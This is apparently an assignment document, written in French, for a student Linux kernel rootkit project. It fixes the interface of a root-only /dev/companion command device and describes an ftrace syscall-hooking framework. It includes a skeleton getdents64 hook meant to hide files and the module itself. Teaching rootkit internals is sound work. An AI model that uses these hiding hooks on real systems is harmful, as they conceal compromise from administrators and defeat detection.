# Segment B — Interface Contract (Jalon J1)

Ce document fige l'interface exposée par le segment B (cœur noyau + canal
de commande) au jalon J1. Les segments C (furtivité) et D (compagnon
userland) s'appuient dessus. Tout ce qui est marqué « stable » ne changera
plus après J1 ; le reste est détaillé par l'étudiant titulaire de B.

## Canal de commande

Le segment B expose un **misc device** unique : `/dev/companion`.

- Minor dynamique (`MISC_DYNAMIC_MINOR`), mode `0600` (propriétaire root).
- C'est l'unique point d'entrée entre l'espace utilisateur et le cœur
  noyau. Aucun autre canal (pas de `procfs`, pas de `sysfs`) n'est exposé
  par B à J1.

**Côté compagnon (segment D).** Le compagnon ouvre `/dev/companion`, écrit
une `struct cmd_request` sérialisée via `write()`, puis lit la
`struct cmd_response` correspondante via `read()`. Une variante par
`ioctl()` est réservée (voir `companion_dev.c`) mais non décodée à J1.

**Côté furtivité (segment C).** C peut poser ses hooks autour de ce canal
sans modifier le format d'échange : le misc device et sa table
`file_operations` sont des points d'ancrage stables. B n'impose aucune
contrainte sur la manière dont C dissimule le module ou le nœud `/dev`,
tant que le nom `companion` et le format de `protocol.h` restent inchangés.

## Commandes disponibles

Numérotation fixée à J1 (stable). La sémantique est implémentée par B
dans `companion_dev.c`.

| Nom              | Code hex | Argument (payload)            | Statut / data retournés                          |
| ---------------- | -------- | ----------------------------- | ------------------------------------------------ |
| `CMD_PING`       | `0x01`   | aucun (`arg_len = 0`)         | `OK`, aucune donnée                              |
| `CMD_GET_VERSION`| `0x02`   | aucun (`arg_len = 0`)         | `OK`, chaîne de version (sans NUL final)        |
| `CMD_SET_FLAG`   | `0x03`   | 1 × `u32` index de flag       | `OK` si index < 64, sinon `ERR` ; aucune donnée |
| `CMD_CLEAR_FLAG` | `0x04`   | 1 × `u32` index de flag       | `OK` si index < 64, sinon `ERR` ; aucune donnée |

Toute commande inconnue renvoie `CMD_STATUS_UNKNOWN`. L'index de flag doit
être dans `[0, BITS_PER_LONG)` (64 sur une cible 64 bits).

**Contraintes de trame (validées par B, rejet avec `-errno`) :**

- `write()` doit transmettre au moins `sizeof(struct cmd_request)` octets
  (sinon `-EINVAL`).
- `arg_len` doit valoir exactement `taille_écrite - sizeof(struct cmd_request)`
  (sinon `-EINVAL`).
- La taille totale écrite est bornée à `sizeof(struct cmd_request) + 4096`
  (sinon `-EMSGSIZE`).
- La réponse se lit ensuite via `read()` ; elle supporte les lectures
  partielles. Une nouvelle commande (`write()`) remplace toute réponse non
  encore lue.

Codes de statut (`cmd_response.status`) :

| Nom                 | Valeur | Sens                                   |
| ------------------- | ------ | -------------------------------------- |
| `CMD_STATUS_OK`     | `0`    | commande traitée avec succès           |
| `CMD_STATUS_ERR`    | `1`    | commande reconnue mais échouée         |
| `CMD_STATUS_UNKNOWN`| `2`    | identifiant de commande non reconnu    |

## Framework de remplacement de syscall (pour C)

Second livrable de B : un framework de hook générique basé sur **ftrace**
(conforme au TP03 — pas de modification directe de `sys_call_table`, pas de
patch du bit WP de CR0). C l'utilise pour installer ses hooks de furtivité.

API publique (`include/syscall_hook.h`) :

```c
struct ftrace_hook {
	const char *name;      /* symbole à remplacer, ex. "__x64_sys_getdents64" */
	void *function;        /* fonction de remplacement                        */
	void *original;        /* &(pointeur original) -> rempli à l'install      */
	/* address / ops : internes, remplis par fh_install_hooks()               */
};

#define HOOK(name, function, original) /* initialiseur de table */

int  fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
```

Côté C, le schéma d'usage (exemple `getdents64`) :

```c
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	long ret = orig_getdents64(regs);   /* appel de l'original */
	/* ... filtrage du buffer linux_dirent64 pour masquer une entrée ... */
	return ret;
}

static struct ftrace_hook c_hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};
/* à l'init : fh_install_hooks(c_hooks, ARRAY_SIZE(c_hooks));  (goto cascade) */
/* à l'exit : fh_remove_hooks(c_hooks, ARRAY_SIZE(c_hooks));                  */
```

Règles d'usage :

- `fh_install_hooks` est **tout-ou-rien** : en cas d'échec, les hooks déjà
  posés par l'appel sont retirés avant le retour. Toujours vérifier le retour.
- La fonction de remplacement doit appeler l'original via le pointeur
  `original` pour le comportement normal (la garde anti-récursion le gère).
- **Interdit de hooker `kill`** (contrainte sujet).

Config noyau requise sur la cible : `CONFIG_KPROBES`, `CONFIG_FUNCTION_TRACER`,
`CONFIG_DYNAMIC_FTRACE`, `CONFIG_DYNAMIC_FTRACE_WITH_REGS`, `CONFIG_KALLSYMS`.

## Règles de stabilité (figé à J1)

Ne changera plus après J1 :

- Le nom du device : `companion` (donc `/dev/companion`).
- Le type de device : misc device, minor dynamique, mode `0600`.
- Les structures `cmd_request` / `cmd_response` de `protocol.h` (ordre et
  type des champs, sémantique des flexible array members `payload` / `data`).
- Les valeurs des codes `CMD_STATUS_*`.
- Les valeurs numériques des commandes **déjà listées** ci-dessus.

Peut encore évoluer après J1 :

- L'ajout de **nouvelles** commandes (codes ≥ `0x05`).
- Le corps de `write()`, `read()` et `unlocked_ioctl()` (décodage effectif).
- L'encodage détaillé des arguments et des retours de chaque commande.

## Dépendances

**Ce que C attend de B :**

- Un module unique `rootkit_b.ko` au cycle de vie propre
  (`init`/`exit` symétriques), sur lequel poser les hooks.
- Un canal de commande stable servant de point d'ancrage.
- Le **framework de hook ftrace** (`fh_install_hooks` / `fh_remove_hooks`,
  voir section dédiée) pour poser ses hooks de furtivité.
- Aucun hook de l'appel système `kill` côté B (contrainte sujet) : C garde
  la main sur le choix des appels système remplacés (sauf `kill`).

**Ce que D attend de B :**

- Le header `protocol.h` partagé, compilable en espace utilisateur.
- Le nœud `/dev/companion` accessible en lecture/écriture (root).
- Le contrat `write()` (envoi requête) → `read()` (lecture réponse).
